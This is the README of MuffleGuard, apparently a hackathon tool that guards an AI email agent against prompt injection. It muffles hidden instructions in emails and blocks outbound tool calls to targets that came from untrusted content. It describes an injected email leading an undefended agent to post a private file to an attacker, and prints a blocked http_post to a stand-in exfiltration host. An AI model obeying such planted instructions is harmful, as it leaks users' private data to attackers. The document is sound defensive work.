# MuffleGuard

A guard that sits between an AI agent and its tools. It muffles instructions
hidden in the content the agent reads, and refuses any action whose target was
chosen by that content rather than by the user.

Built for TatHack '26, Track 2 (Safe & Trustworthy AI).

> Your AI agent can read the attacker's email. MuffleGuard makes sure it can't obey it.

## The problem

An agent that reads email and can send it has everything an attacker needs: it
reads text the attacker wrote, it holds data worth stealing, and it can send
things out. An instruction hidden in an email is read by the model exactly like
one from the user.

## How it works

Two layers, so that one miss is not a breach.

**Detect and muffle.** Hidden carriers (invisible Unicode, white-on-white CSS,
HTML comments, base64) are decoded and removed. Optional CPU classifiers can
flag sentences addressed to the model rather than to the user. Only those
sentences are removed, so the rest of the email still reaches the agent.

**Data-flow policy.** Before any outbound tool call runs, every target is traced
back to where it came from. One invariant decides it:

> An outbound tool call may only act on a target the user chose,
> unless a human approves it.

No model is consulted, so there is nothing to argue out of it. A target found
only in an email is refused and the refusal names the email. A target found
nowhere goes to a human. Separately, recognized secrets and copied excerpts
from private tool results are blocked in outbound tool arguments. A request-level
`ASK` also stops before the first model call; the caller must resolve it before
starting a new run.

Every decision is written to a hash-chained SQLite log. A separately recorded
head makes deleting the last row detectable while the database metadata remains
intact.

Live demo: **https://attack-lab-production.up.railway.app** — the site is at `/` and the
Attack Lab, with a real guard behind it, at `/live`.

## Try it

```bash
python -m venv .venv && .venv/Scripts/python -m pip install -r requirements-dev.txt
cp .env.example .env            # add an OpenAI-compatible key
.venv/Scripts/python -m pytest  # no network needed
.venv/Scripts/python tools/hero_attack.py --no-muffle
```

Or open the Attack Lab in a browser:

```bash
.venv/Scripts/python -m uvicorn web.app:app --port 8000
```

`/` is the site and `/live` is the Attack Lab, with a real guard behind it:
every line on that page is a decision the guard actually made. The site pages
are built from the design exports by `python tools/port_design.py <export
folder>`.

Both runs appear side by side, streamed as they happen, with the injected
sentences struck through and every refusal carrying the line that explains it.
The audit viewer will edit one of its own entries on request, so verification
can be seen catching it (set `DEMO_TAMPER=1`).

The built-in request uses a fixed synthetic response replay, so the comparison
works offline. Custom requests use the configured provider when a key and daily
call allowance are available.

### Enable custom prompts on the deployed Attack Lab

The public demo starts in recorded replay mode until its server has a provider
key. In Railway, open the service's **Variables** settings and add `LLM_API_KEY`
as a secret. The default provider is OpenRouter; to use another OpenAI-compatible
provider, also set `LLM_BASE_URL` and `LLM_MODEL`. Keep `DEMO_DAILY_RUNS` unset
for its default allowance of 200 calls, or set it to at least `16` so both sides
of a comparison can each use their eight-call ceiling. Redeploy after changing
variables. The page should then show **Live model available**, and custom
requests will be sent to that model.

Never put a provider key in the browser, this repository, or a committed
`.env` file. By default the inbox and files remain simulated. The optional
Google connector can read Gmail and text files from Drive after an explicit
account connection and the **Use connected Google data** toggle. It cannot
send email, edit, or delete Drive data. Mail and file content is sent to the
configured model provider when a run uses Google data; use synthetic test data.

### Connect a Google test account

Enable Gmail API and Google Drive API in the Cloud project, set the OAuth
audience to External / Testing, and add the test account under **Audience → Test
users**. In **Data Access**, include `gmail.readonly` and
`drive.readonly`. This connector requests read-only access so it can search the
test inbox and find named files in Drive; Google's consent screen will show
those permissions. These are restricted scopes. Keep the app in Testing for
your listed test user; publishing for other users requires Google verification,
and server storage or transmission of restricted-scope data can require a
security assessment. `drive.readonly` grants read-only access across the Drive,
so use only the disposable test account.

For this first connector, a run lists at most 10 inbox messages and reads their
message bodies (attachments are skipped). Drive reads text, Markdown, CSV, JSON,
Google Docs, and Google Sheets files up to 1 MB; give the agent an exact unique
file name.

Create a **Web application** OAuth client and add this exact authorized redirect
URI:

```text
https://attack-lab-production.up.railway.app/auth/google/callback
```

In Railway's service Variables, set `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`,
and `GOOGLE_REDIRECT_URI` to the OAuth client's values and the same callback URI.
Keep the client secret in Railway only. Redeploy, open the Attack Lab, choose
**Connect Gmail + Drive**, sign in as the test user, then select **Use connected
Google data** before running. A live model key is also required; recorded replay
cannot read Google data. Each Google-side run reserves up to 12 model calls so
it can read a mailbox and still finish; keep `DEMO_DAILY_RUNS` at 24 or higher
for a complete two-agent comparison.

OAuth tokens are kept in process memory, never written to disk. The connector
uses one Railway process; restarting or redeploying clears the connection, so
connect again afterward. Runs are on demand, not background sync. While the
OAuth app remains in Testing, Google may expire refresh tokens after seven days.

Sentence classifiers are off by default. Pass `--detector` after placing both
ONNX model snapshots in the local Hugging Face cache; MuffleGuard does not
download weights automatically. See [REVIEW.md](REVIEW.md) for setup. BPE
tokenizer files are checked for unsafe merge layouts before the native parser
loads them. The audit log is in memory by default for the demo. Set
`MUFFLEGUARD_AUDIT_PATH` to a writable SQLite file path to retain it across
process restarts.

`hero_attack.py` runs the same request twice. Undefended, the agent obeys an
email that nobody can see and posts a private file to the attacker. Defended
with every content defence switched off, the model still obeys, and the policy
engine refuses the call:

```
BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
```

## What it measures

216 runs: 8 ordinary tasks crossed with 8 attack deliveries, each under three
defences. The agent is a deterministic stand-in that obeys every instruction it
can actually see, so what is measured is the guard's own property rather than
how gullible a particular model is on a particular day. It reads only what the
guard let through, so muffling genuinely stops it.

| Defence | Data reached the attacker | The agent tried | Stopped when it tried | Ordinary tasks finished |
| --- | --- | --- | --- | --- |
| No guard | 100% (64/64) | 100% (64/64) | 0% (0/64) | 100% (8/8) |
| Policy engine only | **0%** (0/64) | 100% (64/64) | **100%** (64/64) | 100% (8/8) |
| Policy engine and muffling | **0%** (0/64) | 50% (32/64) | **100%** (32/32) | 100% (8/8) |

The middle row is the claim: with every content defence switched off, the
policy engine refused all 64 attempts and nothing reached the attacker.
Muffling then halves the attempts, because the instruction is gone before the
agent reads it. Ranges on the page are 95% Wilson intervals.

Reproduce it with `python -m evaluation.run --adversary`, which costs nothing.
`python -m evaluation.run` runs the same suite against a real model instead;
that needs credit on the configured provider.

## What is not claimed

- The audit log is tamper-**evident**, not tamper-proof: anyone who can write
  the database can rewrite both the chain and its recorded head. Detecting a
  malicious rewrite or deletion of the head itself needs an external checkpoint
  or signing key the writer does not hold.
- URL provenance checks the host name only. It does not bind scheme, port, path,
  DNS result, or redirect destination; real network adapters need an egress
  allowlist and SSRF protections.
- An address the user pastes into their own request is trusted, because they
  chose it.
- Detection thresholds are not yet tuned: "please ignore my last email" is
  currently flagged. The scorecard's three conditions do not include the
  classifiers, so no claim is made about them.
- The headline numbers use a deterministic worst-case agent, not a model. How
  often a real model acts on one of these injections is a property of that
  model; the Attack Lab demonstrates it live on openai/gpt-4o-mini.
- The egress checks are heuristics. They catch known secret formats and copied
  runs of three or more meaningful words, but not every encoding or paraphrase.

## Privacy and integration limits

The guard checks calls from the model to tools. The configured model provider
still receives the user's request and each tool result sent back to the model;
only use data that provider is approved to process. The general `LLM` client does
not cache responses by default; set `LLM_CACHE=1` only when you want live
responses written to local disk. `hero_attack.py` opts into its local response
cache for the synthetic demo; `--no-cache` disables it. Cache responses may
contain user data, so keep live data out of the demo cache and out of Git.

The audit log stores decisions and reason text, not full tool results or the
content removed by muffling. Reasons and source labels can still contain
addresses or file names; restrict access to persistent logs and set a retention
period that fits your use.

The shipped inbox, file, web and outbound tools operate on an in-memory fake
world. A real integration needs its own access control, URL/SSRF protections,
and deployment review; this demo does not implement those service boundaries.

Reviewing this? Start with [THREAT_MODEL.md](THREAT_MODEL.md) for what is
defended and against whom, [SECURITY.md](SECURITY.md) for reporting and the
security-relevant settings, [QA.md](QA.md) for the questions we expect, and
[REVIEW.md](REVIEW.md) for the walkthrough.

Known gaps are asserted as they behave in `tests/test_redteam.py`.

## Credits

| What | Licence |
| --- | --- |
| [protectai/deberta-v3-base-prompt-injection-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) | Apache-2.0 |
| [Horizon-Labs/prompt-injection-guard-small](https://huggingface.co/Horizon-Labs/prompt-injection-guard-small) | Apache-2.0 |
| [onnxruntime](https://onnxruntime.ai/), [tokenizers](https://github.com/huggingface/tokenizers), [numpy](https://numpy.org/) | MIT / Apache-2.0 / BSD-3 |
| [httpx](https://www.python-httpx.org/) | BSD-3 |
| [FastAPI](https://fastapi.tiangolo.com/), [Starlette](https://www.starlette.io/), [Uvicorn](https://www.uvicorn.org/) | MIT / BSD-3 / BSD-3 |
| [pytest](https://pytest.org/), [Hypothesis](https://hypothesis.works/) | MIT / MPL-2.0 |
| [GSAP](https://gsap.com/) 3.12.5 with ScrollTrigger, on the site pages | GSAP standard licence (no-charge tier) |
| [anime.js](https://animejs.com/) 3.2.2, on the site pages | MIT |
| [Motion](https://motion.dev/) 11.11.13, on the site pages | MIT |
| [Archivo](https://fonts.google.com/specimen/Archivo) and [IBM Plex Mono](https://github.com/IBM/plex), served from `site/assets/fonts` | SIL OFL 1.1 |
| [Pillow](https://python-pillow.org/), used once to crop the logo | MIT-CMU |
| Agent model via [OpenRouter](https://openrouter.ai/) | provider terms |

The Verhoeff and Luhn checksums are implemented from their published
definitions. The sandbox inbox, files and attacks are written by us; no real
account or personal data is used anywhere.

The three animation bundles and both typefaces are vendored under
`site/assets/`, so the pages load nothing from a CDN and the demo survives a
venue network that blocks one. `tests/test_site.py` asserts that.

The site's look comes from a design system we made for this project in Claude's
design tool and then exported; `site/assets/ds.css` is that export, and
`tools/port_design.py` turns the exported pages into the ones served here. No
project generator or third-party template was used: there is no `create-vite`
scaffold anywhere in this repository.

## AI usage

Developed with Claude Code (Claude Opus) used for pair programming: design
discussion, drafting modules and tests, and adversarial review. Every design
decision, the security model and the threat model are the team's own, and each
member can explain the code they own. The demo video is recorded by a person.

## Team

- Mohith Akshay Duggirala — [@Trafalgar-2006](https://github.com/Trafalgar-2006)
- [@samdoglover](https://github.com/samdoglover)

Licensed under Apache-2.0.
